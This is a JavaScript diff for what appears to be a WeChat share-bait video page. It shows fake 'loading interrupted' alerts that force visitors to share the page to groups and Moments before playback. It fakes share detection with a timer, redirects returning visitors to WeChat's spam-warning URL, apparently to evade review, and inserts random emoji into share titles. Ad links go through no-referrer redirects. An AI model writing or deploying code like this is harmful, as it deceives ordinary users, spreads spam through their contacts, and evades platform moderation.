@@ -4,11 +4,10 @@ var elId = 'mod_player_skin_0';
 var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
 var elWidth = $("#js_content").width();
 var alertTimes = 0;
-var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in document ? 'mozHidden' : 'msHidden';
+var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in document ? 'mozHidden' : '';
 var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
 var shareATimes = 0;
-var matches = /view-(\w+)/.exec(location.href);
-var vcode = matches[1] || '';
+var vcode = configData.code;
 var til = (configData.title).replace('<city>', '');
 var vid = vcode;
 var delayTime = configData.stop_time;
@@ -16,6 +15,7 @@ var delayTime = configData.stop_time;
 var onVisibilityChange = function () {
     if (!document[hiddenProperty]) {
         if (delayTime < 9999) {
+            switchStatus = true;
             shareATimes += 1;
             setTimeout(share_tip(shareATimes), 2000);
         }
@@ -32,7 +32,7 @@ $('.time').text(getDate());
 
 document.addEventListener(visibilityChangeEvent, onVisibilityChange);
 
-if (localStorage.getItem('opened' + vcode) && !(/debug=1/.test(location.href)) && !sessionStorage.isDT && false) {
+if (localStorage.getItem('opened' + vcode) && !(/debug=1/.test(location.href)) && !sessionStorage.isDT ) {
     location.href = 'https://weixin110.qq.com/cgi-bin/mmspamsupport-bin/newredirectconfirmcgi?main_type=2&evil_type=43&source=2&url=';
 }
 ;
@@ -83,7 +83,7 @@ function hh() {
 
 function jp() {
     try {
-        location.href = data.page.ad_back + '?r=' + (new Date().getTime());
+        location.href = configData.back_url + '?r=' + (new Date().getTime());
     } catch (e) {
         console.log(e)
     }
@@ -116,11 +116,7 @@ function playVideo(vid, elId, elWidth) {
 };
 
 function wxalert(msg, btn, callback) {
-    if (alertTimes == 0) {
-        var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
-        $("body").append(dialog)
-    }
-    alertTimes++;
+
     var d = $('#lly_dialog');
     d.show(200);
     d.find("#lly_dialog_msg").html(msg);
@@ -135,7 +131,7 @@ function wxalert(msg, btn, callback) {
 };
 
 function show_tip() {
-    wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 22px;color: red">数据加载中断</b><br/>请分享到微信群，可<b style="color: red;">免流量加速观看</b>', '好')
+    wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 22px;color: red">数据加载中断</b><br/>请分享到<b style="color: red;">朋友圈</b>，可<b style="color: red;">免流量加速观看</b>', '好')
 };
 
 function jssdk() {
@@ -159,10 +155,8 @@ function getUrlParam(name) {
 
 
 function share_tip(share_app_times) {
+
     var shareTitle = til;
-    if (remote_ip_info.city) {
-        shareTitle = remote_ip_info.city + til;
-    }
 
     var emojis = $('#emojisPool').text().split(',');
     var ri = Math.floor(Math.random() * shareTitle.length);
@@ -197,13 +191,17 @@ function share_tip(share_app_times) {
 
     switch (share_app_times) {
         case 1:
-            wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群即可观看！', '好');
+            wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个群即可观看！', '好',function(){
+                start = new Date().getTime();
+                $('#fenxiang').attr('src','/public/images/fenxiang-bk-2.png')
+            });
+
             break;
         case 2:
-            wxalert('<span style="font-size: 30px;color: #f5294c">分享成功！</span><br/>最后一步!请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可!', '好');
+            wxalert('<span style="font-size: 30px;color: #f5294c">分享成功！</span><br/>最后一步!请分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群即可观看!', '好');
             break;
         case 3:
-            wxalert('<b style="font-size: 22px">分享成功！</b><br/>点击确定继续播放。', '确定', function () {
+
                 delayTime = 99999;
                 $("#fenxiang").hide();
                 sessionStorage.removeItem("pt");
@@ -212,7 +210,7 @@ function share_tip(share_app_times) {
                 player.play();
                 localStorage.setItem(vid, 's');
                 sessionStorage.removeItem("load");
-            });
+
             break;
         default :
             break;
@@ -227,6 +225,14 @@ function jump(url) {
     document.body.appendChild(a);
     document.getElementById('m_noreferrer').click();
     document.body.removeChild(a);
+};
+
+function ad_top_click(url) {
+    jump(url);
+};
+
+function ad_bottom_click(url) {
+    jump(url);
 };
 
 function chkwvs() {
@@ -264,8 +270,28 @@ $('#pauseplay').on('click', function () {
     jssdk();
 });
 
+var start = 0;
+var switchStatus = false;
+
+$('#fenxiang').on('touchmove', function () {
+    start = new Date().getTime();
+});
+
 $('#fenxiang').on('click', function () {
-    jssdk();
+    var now = new Date().getTime();
+    if (now - start > 4500 && switchStatus) {
+        shareATimes += 1;
+        setTimeout(share_tip(shareATimes), 2000);
+        start = new Date().getTime();
+    } else if( switchStatus){
+        wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 22px;color: red">数据加载中断</b><br/>请继续分享到<b style="color: red;">【群】</b>', '好', function () {
+            start = new Date().getTime();
+        });
+    }else{
+        wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 22px;color: red">数据加载中断</b><br/>注意要分享到<b style="color: red;">【朋友圈】</b>', '好', function () {
+            start = new Date().getTime();
+        });
+    }
 });
 
 $('#like').on('click', function () {
@@ -377,7 +403,7 @@ $.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js', func
     for (var n = 0; n < configData.shareVideos.length; n++) {
         var li = $('<li style="list-style:none;line-height:1.5;margin-top:5px;"></li>');
         li.text(configData.shareVideos[n].title);
-        var alink = $('<a href="' + configData.hosts[n].hosts + 'view-' + configData.shareVideos[n].code + '.shtml"></a>');
+        var alink = $('<a href="' + configData.hosts[n].hosts + '?vid=' + configData.shareVideos[n].map_id + '"></a>');
         alink.append(li);
         $('#hutui').append(alink);
     }
@@ -402,7 +428,7 @@ $.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js', func
 
     $('header').html(title.join(''));
 
-    var shareTitle = remote_ip_info.city + til;
+    var shareTitle = til;
 
     var emojis = $('#emojisPool').text().split(',');
     var ri = Math.floor(Math.random() * shareTitle.length);
